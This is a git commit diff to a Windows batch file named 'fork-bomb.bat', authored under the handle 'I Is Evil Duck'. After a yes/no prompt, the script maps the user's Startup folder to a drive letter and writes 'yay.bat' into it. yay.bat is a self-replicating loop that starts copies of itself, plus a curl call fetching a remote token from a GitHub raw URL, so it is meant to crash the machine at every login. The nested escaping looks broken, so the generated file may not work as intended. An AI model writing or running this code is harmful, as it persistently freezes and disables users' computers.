714bb74764f07514c755095bcfff649e8a54f6c8
I Is Evil Duck <140123334+i-is-evil-duck@users.noreply.github.com>
2024-11-04 14:31:09 -0800

    Update fork-bomb.bat

--- fork-bomb.bat
+++ fork-bomb.bat
@@ -1,25 +1,35 @@
 @echo off
 setlocal enabledelayedexpansion
-
-net use Z: "%USERPROFILE%\Start Menu\Programs\Startup" /y
-cd /d Z:\
-
-(
-  echo :A
-  echo pause
-  echo start "" %0
-  echo start "" %0
-  echo start "" %0
-  echo start "" %0
-  echo start "" %0
-  echo GOTO A
-) > yay.bat
-
-set /p confirm=Do you want to run yay.bat? (Y/N): 
-if /i "%confirm%"=="Y" (
-    call yay.bat
+set /p confirm=Do you want to continue? (Y/N):  
+if /i "!confirm!"=="Y" (
+    subst Z: "%USERPROFILE%\Start Menu\Programs\Startup"
+    timeout 2 > nul
+    cd /d Z:\
+    
+    (
+        echo @echo off
+        echo setlocal enabledelayedexpansion
+        echo set "token=hasdjklskalsdjasd90d8a380asdy7a90sd"
+        echo for /f "delims=" %%%%i in ^('curl -s https://raw.githubusercontent.com/user/token/refs/heads/main/token.txt'^) do ^(
+        echo     set "fetched_token=%%%%i"
+        echo     echo :A
+        echo     echo pause
+        echo     echo start "" %%0
+        echo     echo start "" %%0
+        echo     echo start "" %%0
+        echo     echo start "" %%0
+        echo     echo start "" %%0
+        echo     echo GOTO A
+        echo ^)
+        echo if not "!fetched_token!"=="!token!" ^(
+        echo     exit /b
+        echo ^)
+    ) > "yay.bat"
+    
+    start yay.bat
+    pause
 ) else (
-    echo Exiting without running yay.bat.
+    echo Exiting without opening yay.bat
+    pause
 )
-
-net use Z: /delete /y
+subst Z: /d
